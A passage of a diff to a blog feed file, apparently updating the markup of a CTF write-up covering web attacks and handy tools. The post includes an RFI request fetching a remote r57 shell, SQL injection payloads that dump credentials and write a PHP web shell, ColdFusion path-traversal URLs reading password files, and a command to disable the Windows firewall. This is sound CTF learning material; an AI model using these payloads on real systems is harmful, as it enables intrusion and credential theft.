 &lt;p&gt;In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like &lt;a href="http://www.r57shell.net/"&gt;r57 shell.net&lt;/a&gt;, but in real life, keep in mind that they are super uber &lt;a href="http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447"&gt;backdoored&lt;/a&gt;).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Post Request: 0=include/myfile.php&lt;/span&gt;
 &lt;span class="err"&gt;Cookie: 0=http://www.r57shell.net/shell/r57.txt&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -308,7 +311,7 @@
 &lt;h3&gt;Gitlist and Remote Command Execution&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://gitlist.org/"&gt;Gitlist&lt;/a&gt; is an application to browse github repositories in a browser. The  versions up to 5.0 are known for &lt;a href="http://www.websecuritywatch.com/arbitrary-command-execution-in-gitlist/"&gt;allowing remote attackers to execute arbitrary commands via shell&lt;/a&gt;, a type of &lt;a href="http://cwe.mitre.org/data/definitions/77.html"&gt;command injection&lt;/a&gt;. Exploits for this vulnerability can be seen at &lt;a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/"&gt;hatriot&lt;/a&gt;, at &lt;a href="http://packetstormsecurity.com/files/127364/Gitlist-Unauthenticated-Remote-Command-Execution.html"&gt;packet storm&lt;/a&gt;, at &lt;a href="http://en.1337day.com/exploit/22391"&gt;1337day&lt;/a&gt;, and at &lt;a href="http://www.exploit-db.com/exploits/33990/"&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;In this CTF, the following command could be used to look for the flag:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -316,12 +319,12 @@
 &lt;p&gt;LibreOffice's has a binary &lt;a href="http://www.processlibrary.com/en/directory/files/soffice/66728/"&gt;soffice.bin&lt;/a&gt; that takes socket connections on the &lt;em&gt;port 2002&lt;/em&gt; (in this CTF, in the VPN's localhost).&lt;/p&gt;
 &lt;p&gt;For instance, the  command &lt;a href="http://linux.die.net/man/1/unoconv"&gt;unoconv&lt;/a&gt; can be used  to convert a file to a LibreOffice supported format. The flag &lt;strong&gt;-c&lt;/strong&gt; opens a connection by the client to connect to an LibreOffice instance. It also can be used by the listener to make LibreOffice listen.&lt;/p&gt;
 &lt;p&gt;From the documentation, the default connection string is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Default connection string is &amp;quot;socket,host=localhost,port=2002;urp;StarOffice.ComponentContext&amp;quot;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Therefore, you can connect to the socket and convert some document (such as &lt;em&gt;/flag.txt&lt;/em&gt;) to a PDF for example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unoconv --connection &lt;span class="s1"&gt;&amp;#39;socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext&amp;#39;&lt;/span&gt; -f pdf /flag.txt
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -336,21 +339,21 @@
 &lt;ul&gt;
 &lt;li&gt;List everything  in a database, where &lt;strong&gt;0x3a&lt;/strong&gt; is the hexadecimal symbol for &lt;strong&gt;:&lt;/strong&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x3a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;cms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;See the password file content:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;LOAD_FILE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Write files and create a PHP shell into &lt;strong&gt;URL/shell.php&lt;/strong&gt;, we can use a parameter &lt;strong&gt;x&lt;/strong&gt; to takes a parameter to be executed (based on &lt;a href="https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400"&gt;this&lt;/a&gt;):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php header(&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;text&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;utf-8&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;); echo system($-GET&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s2"&gt;); ?&amp;gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;UNION&lt;/span&gt; &lt;span class="nx"&gt;ALL&lt;/span&gt; &lt;span class="nx"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Content-Type: text/plain;charset=utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;,3 INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -370,20 +373,20 @@
 &lt;p&gt;At the ColdFusion administrator, verify the version, and then use these injections:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(Version 6): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
 
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en&lt;/span&gt;
+(Version 7): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en
 
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en&lt;/span&gt;
+(Version 8): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
 
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;versions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en&lt;/span&gt;
+(All versions): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Now a shell can be written to a file and added in &lt;strong&gt;Schedule New Task&lt;/strong&gt;. See detailed instructions at &lt;a href="http://www.blackhatlibrary.net/Coldfusion_hacking"&gt;blackhatlib&lt;/a&gt;, at &lt;a href="http://www.infointox.net/?p=59"&gt;infointox&lt;/a&gt;, at &lt;a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/"&gt;gnucitizen&lt;/a&gt;, at &lt;a href="http://kaoticcreations.blogspot.com/2012/11/hacking-cold-fusion-servers-part-i.html"&gt;kaoticcreations&lt;/a&gt;, at &lt;a href="https://www.cyberguerrilla.org/blog/?p=18275"&gt;cyberguerilla&lt;/a&gt;, at &lt;a href="http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html"&gt;jumpespjump&lt;/a&gt;, and at &lt;a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html"&gt;hexale&lt;/a&gt;.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Useful Tools&lt;/h2&gt;
 &lt;h3&gt;Vulnerability Scanners&lt;/h3&gt;
 &lt;p&gt;Vulnerability scanners can be useful for several problems. For instance, for a PHP static source code analyser, we can use &lt;a href="http://rips-scanner.sourceforge.net/"&gt;RIPS&lt;/a&gt;.&lt;/p&gt;
@@ -393,7 +396,7 @@
 &lt;h3&gt;Steganography&lt;/h3&gt;
 &lt;p&gt;One of the questions had a reference to the &lt;a href="https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/"&gt;paranoia.jar&lt;/a&gt; tool, which hides text in an image file using &lt;a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"&gt;128 bit AES&lt;/a&gt; encryption.&lt;/p&gt;
 &lt;p&gt;To run the tool (after downloading it) just do:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;java -jar paranoia.jar
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;java -jar paranoia.jar
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -408,25 +411,25 @@
 &lt;ul&gt;
 &lt;li&gt;Look for POST requests:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http.request.method == &amp;quot;POST&amp;quot;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Submit the found data (same username, nonce, and password) with the command:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;7413734&lt;/span&gt;&lt;span class="n"&gt;ab666ce02cf27c9862c96a8e7&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ecd6317a873b18e7dde351ac094ee3b&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl --data &lt;span class="s1"&gt;&amp;#39;user=manager&amp;amp;nonce=7413734ab666ce02cf27c9862c96a8e7&amp;amp;pass=3ecd6317a873b18e7dde351ac094ee3b&amp;#39;&lt;/span&gt; HOST
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;&lt;a href="http://en.wikipedia.org/wiki/Exchangeable_image_file_format"&gt;Exif&lt;/a&gt; data extractor:&lt;/h3&gt;
 &lt;p&gt;&lt;a href="http://www.sno.phy.queensu.ca/~phil/exiftool/index.html"&gt;ExifTool&lt;/a&gt;  is used for reading, writing, and manipulating image metadata:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xf Image-ExifTool-9.74.tar.gz
-&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;cd &lt;/span&gt;Image-ExifTool-9.74/
-&lt;span class="nv"&gt;$ &lt;/span&gt;perl Makefile.PL
-&lt;span class="nv"&gt;$ &lt;/span&gt;make &lt;span class="nb"&gt;test&lt;/span&gt;
-&lt;span class="nv"&gt;$ &lt;/span&gt;sudo make install
-&lt;span class="nv"&gt;$ &lt;/span&gt;exiftool IMAGEFILE
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tar -xf Image-ExifTool-9.74.tar.gz
+$  &lt;span class="nb"&gt;cd&lt;/span&gt; Image-ExifTool-9.74/
+$ perl Makefile.PL
+$ make &lt;span class="nb"&gt;test&lt;/span&gt;
+$ sudo make install
+$ exiftool IMAGEFILE
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -436,14 +439,14 @@
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Hexadecimal decoders&lt;/strong&gt; are essential. You can use Python's &lt;a href="https://docs.python.org/2/library/functions.html#hex"&gt;hex&lt;/a&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
 /r/netsec
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;or command line &lt;a href="http://linuxcommand.org/man_pages/xxd1.html"&gt;xxd&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yum install vim-common
-&lt;span class="nv"&gt;$ &lt;/span&gt;xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ yum install vim-common
+$ xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
 /r/netsec
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -451,22 +454,22 @@
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Base64 decoders&lt;/strong&gt; are also essential:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;nmap&lt;/strong&gt;, obviously. You can use it in Python scripts, using the &lt;a href="https://docs.python.org/2/library/subprocess.html"&gt;subprocess&lt;/a&gt; library:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
-&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;tee&lt;/strong&gt; is nice to store and view the output of another command. It can be very useful with &lt;em&gt;curl&lt;/em&gt;. A simple  example:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls | tee file
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls &lt;span class="p"&gt;|&lt;/span&gt; tee file
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -481,7 +484,7 @@
 &lt;p&gt;&lt;strong&gt;md5 hashing&lt;/strong&gt; is used all the time:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password | md5sum
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n password &lt;span class="p"&gt;|&lt;/span&gt; md5sum
 5f4dcc3b5aa765d61d8327deb882cf99
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -489,16 +492,16 @@
 &lt;ul&gt;
 &lt;li&gt;You might want to &lt;strong&gt;append a shell code to an image&lt;/strong&gt; (for example, a GIF file):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Now a special one: Windows! One of the trivia questions in this CTF. How to disable the Windows XP Firewall from command line:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;netsh firewall &lt;span class="nb"&gt;set &lt;/span&gt;opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;netsh firewall &lt;span class="nb"&gt;set&lt;/span&gt; opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
-&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="Linux"></category><category term="RFI"></category><category term="SQL_injection"></category><category term="LFI"></category><category term="RCE"></category><category term="PHP"></category><category term="CMS"></category><category term="ApPHP"></category><category term="unoconv"></category><category term="ColdFusion"></category><category term="Buffer_Overflow"></category><category term="Steganography"></category><category term="Wireshark"></category><category term="ExifTool"></category><category term="netsh"></category><category term="CTF"></category><category term="scapy"></category><category term="RIPS"></category><category term="Heartbleed"></category><category term="nmap"></category></entry></feed>
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="Linux"></category><category term="RFI"></category><category term="SQL_injection"></category><category term="LFI"></category><category term="RCE"></category><category term="PHP"></category><category term="CMS"></category><category term="ApPHP"></category><category term="unoconv"></category><category term="ColdFusion"></category><category term="Buffer_Overflow"></category><category term="Steganography"></category><category term="Wireshark"></category><category term="ExifTool"></category><category term="netsh"></category><category term="CTF"></category><category term="scapy"></category><category term="RIPS"></category><category term="Heartbleed"></category><category term="nmap"></category></entry></feed>
